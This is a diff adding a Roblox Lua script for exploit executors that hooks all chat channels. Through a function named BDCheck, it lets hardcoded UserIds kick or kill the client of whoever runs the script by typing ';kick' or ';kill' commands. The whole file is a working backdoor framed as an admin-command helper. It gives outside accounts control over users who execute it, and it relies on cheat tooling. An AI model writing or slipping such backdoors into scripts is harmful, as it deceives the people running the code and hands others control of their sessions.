@@ -1,0 +1,85 @@
+-- Now Supports Roblox updated Chat system
+-- Roblox new chat system compatible
+
+local AdminPrefix = ";"
+local Players = game:GetService("Players")
+local TextChatService = game:GetService("TextChatService")
+
+local LocalP = Players.LocalPlayer
+
+-- Admin permissions table
+getgenv().AdminTable = {
+    [9550785595] = { Access = 5 }, -- replace with your UserId
+    [987654321] = { Access = 4 }, -- another admin example
+}
+
+-- Player search
+getgenv().psearch = function(Name)
+    for _, p in pairs(Players:GetPlayers()) do
+        if string.lower(p.Name):sub(1, #Name) == string.lower(Name) then
+            return p
+        end
+    end
+end
+
+-- Command list
+getgenv().AdminCmdList = {
+    ["kick"] = {
+        CommandFunc = function(Player, self, CmdPlayer)
+            if Player == LocalP or Player == "all" then
+                LocalP:Kick(self)
+            end
+        end,
+        Clearence = { [5] = true },
+    },
+
+    ["kill"] = {
+        CommandFunc = function(Player, self, CmdPlayer)
+            if Player == LocalP or Player == "all" then
+                local hum = LocalP.Character and LocalP.Character:FindFirstChildOfClass("Humanoid")
+                if hum then hum:ChangeState(Enum.HumanoidStateType.Dead) end
+            end
+        end,
+        Clearence = { [4] = true, [5] = true },
+    },
+}
+
+-- Chat processor
+getgenv().BDCheck = function(Sender, Chat)
+    if Chat:sub(1, 1) == AdminPrefix then
+        local args = string.split(Chat:sub(2), " ")
+        local Command = getgenv().AdminCmdList[table.remove(args, 1)]
+        local targ1 = getgenv().psearch(args[1] or "")
+        table.remove(args, 1)
+
+        if Command and targ1 then
+            local accessData = getgenv().AdminTable[Sender.UserId]
+            if accessData and Command.Clearence[accessData.Access] then
+                Command.CommandFunc(targ1, table.concat(args, " "), Sender)
+            end
+        end
+    end
+end
+
+-- Hook into new chat system
+local function hookChat(channel)
+    channel.MessageReceived:Connect(function(msg)
+        local speaker = Players:GetPlayerByUserId(msg.TextSource.UserId)
+        if speaker then
+            getgenv().BDCheck(speaker, msg.Text)
+        end
+    end)
+end
+
+-- Listen to all channels
+for _, channel in pairs(TextChatService.TextChannels:GetChildren()) do
+    if channel:IsA("TextChannel") then
+        hookChat(channel)
+    end
+end
+
+TextChatService.TextChannels.ChildAdded:Connect(function(channel)
+    if channel:IsA("TextChannel") then
+        hookChat(channel)
+    end
+end)
